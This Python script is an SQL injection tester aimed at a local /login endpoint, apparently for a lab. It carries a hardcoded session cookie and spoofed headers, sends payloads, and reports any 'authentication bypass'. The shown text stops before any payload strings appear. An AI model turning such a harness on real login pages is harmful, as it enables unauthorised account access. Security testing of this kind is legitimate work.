#!/usr/bin/env python3
"""
SQL Injection Testing Script for /login endpoint
Tests various bypass techniques, encodings, and case variations
"""

import requests
import json
import time
import urllib.parse

# Target configuration
TARGET_URL = "http://127.0.0.1:5003/login"
SESSION_COOKIE = ".eJwlzjEOwzAIQNG7MHcwYAzOZSKwsdo1aaaqd2-kLn_6w_vAvo48n7C9jysfsL8mbEA6yuJevKYZ3XGpMRpNaaqebjKUiIqFiqZIFoyVEynvaWBti7PNHjxp1kiLJdSoau-s2oUtMxkbO-pAlV5mX3WwoC0Pbw435Drz-GsQvj-bfy7z.aVnOqA.TJyqsDjwRheax83x10LTO6w-GR0"

# Cookie jar with session
cookies = {"session": SESSION_COOKIE}

# Set headers
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest"
}

def send_payload(payload_data, payload_name):
    """Send payload and capture response details"""
    print(f"\n{'='*60}")
    print(f"Testing: {payload_name}")
    print(f"Payload: {payload_data}")
    print('='*60)
    
    start_time = time.time()
    try:
        response = requests.post(
            TARGET_URL,
            data=payload_data,
            cookies=cookies,
            headers=headers,
            allow_redirects=False,
            timeout=10
        )
        end_time = time.time()
        response_time = round(end_time - start_time, 3)
        
        print(f"[+] Response Time: {response_time}s")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Headers:")
        for key, value in response.headers.items():
            print(f"  {key}: {value}")
        
        # Check for Set-Cookie headers
        if 'Set-Cookie' in response.headers:
            print(f"\n[!] NEW SESSION TOKEN ISSUED!")
            print(f"Set-Cookie: {response.headers['Set-Cookie']}")
        
        # Try to parse JSON response
        try:
            json_response = response.json()
            print(f"\n[+] JSON Response:")
            print(json.dumps(json_response, indent=2))
            
            # Check for success indicators
            success = json_response.get('success', False)
            message = json_response.get('message', '')
            redirect = json_response.get('redirect', '')
            
            if success or response.status_code == 302 or 'dashboard' in redirect.lower():
                print(f"\n{'*'*60}")
                print(f"[*] AUTHENTICATION BYPASS SUCCESSFUL!")
                print(f"[*] Redirect URL: {redirect}")
                print(f"[*] Success: {success}")
                print(f"[*] Message: {message}")
                print(f"{'*'*60}")
                return True
                
        except json.JSONDecodeError:
            print(f"\n[+] Response Body (non-JSON):")
            print(response.text[:1000])
        
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def test_payloads():
    """Test various SQL injection payloads with different techniques"""
